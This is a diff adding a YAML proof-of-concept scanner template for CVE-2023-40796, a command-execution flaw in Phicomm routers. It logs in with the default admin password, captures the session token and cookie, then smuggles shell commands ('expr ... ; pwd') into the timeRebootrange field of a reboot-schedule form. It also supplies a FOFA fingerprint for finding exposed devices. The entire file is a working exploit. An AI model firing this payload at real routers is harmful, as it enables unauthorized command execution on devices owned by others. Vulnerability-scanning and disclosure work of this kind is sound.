@@ -1,0 +1,60 @@
+id: poc-yaml-phicomm-time-rce
+info:
+  name: 斐讯 Phicomm 路由器后台命令执行(CVE-2023-40796)
+  severity: critical
+  tags:
+  - rce
+  - CVE-2023-40796
+  finger: ''
+  fofa: icon_hash="-1344736688"
+variables:
+  t1: random_int(10000,999999)
+  t2: random_int(10,100)
+  t3: t1 - t2
+requests:
+- method: POST
+  path: /cgi-bin/luci/admin/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action_mode=apply&action_url={{.base_url}}%2Fcgi-bin%2Fluci&username=admin&password=YWRtaW4%3D
+  output:
+  - regex_match(headers, ";stok=(?P<stok>.*?)/admin/index")
+  - regex_match(headers, "sysauth=(?P<Cookie>.*?);")
+  expression: 'status_code == 302
+
+    '
+- method: POST
+  path: /cgi-bin/luci/;stok={{.stok}}/admin/timereboot
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybsubto0f
+    Cookie: sysauth={{.Cookie}}
+  data: '------WebKitFormBoundarybsubto0f
+
+    Content-Disposition: form-data; name="timeRebootEnablestatus"
+
+
+    on
+
+    ------WebKitFormBoundarybsubto0f
+
+    Content-Disposition: form-data; name="timeRebootrange"
+
+
+    00:05;
+
+    expr {{.t1}} - {{.t2}} ; pwd
+
+    ------WebKitFormBoundarybsubto0f
+
+    Content-Disposition: form-data; name="cururl"
+
+
+    {{.base_url}}/cgi-bin/luci/;stok=eed9e2c63aec0d9ed25fce9bfc737299/admin/wifiset/
+
+    ------WebKitFormBoundarybsubto0f--'
+  expression: 'status_code == 200 &&
+
+    contains(body, t3)
+
+    '
+transport: http
